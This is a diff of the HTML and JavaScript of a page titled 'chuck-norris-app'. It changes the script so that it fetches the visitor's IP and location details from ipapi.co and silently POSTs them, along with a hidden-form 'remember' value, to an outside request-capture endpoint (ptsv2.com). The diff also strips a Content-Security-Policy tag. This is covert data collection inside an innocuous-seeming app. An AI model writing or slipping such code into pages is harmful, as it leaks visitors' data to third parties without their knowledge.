@@ -3,7 +3,6 @@
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
 	<title>chuck-norris-app</title>
   <link href="./img/app.js.téléchargement" rel="preload" as="script"><style type="text/css">
 </style></head>
@@ -14,7 +13,7 @@ function truc() {
 }
 function getip() {
 $.getJSON('https://ipapi.co/json/', function(data) {
-		postform(JSON.stringify(data, null, 2));
+		postdata(JSON.stringify(data, null, 2));
 		
 	});
 }
@@ -22,7 +21,7 @@ function postdata(value) {
 $.ajax({
   type: "POST",
     crossDomain: true,
-  url: "http://cribs.free.fr/",
+  url: "https://ptsv2.com/t/4kwyx-1577184656/post",
   data: { remember: value },
   dataType: "json"
 }).done(function(){
@@ -31,13 +30,13 @@ $.ajax({
 }
 function postform() {
 var f = document.createElement('form');
-f.action='http://cribs.free.fr/';
+f.action='https://ptsv2.com/t/4kwyx-1577184656/post';
 f.method='POST';
 //f.target='_blank';
 //f.enctype="multipart/form-data"
 
 var k=document.createElement('input');
-k.type='hidden';k.name='remember';
+k.type='text';k.name='remember';
 k.value='11';
 f.appendChild(k);
 
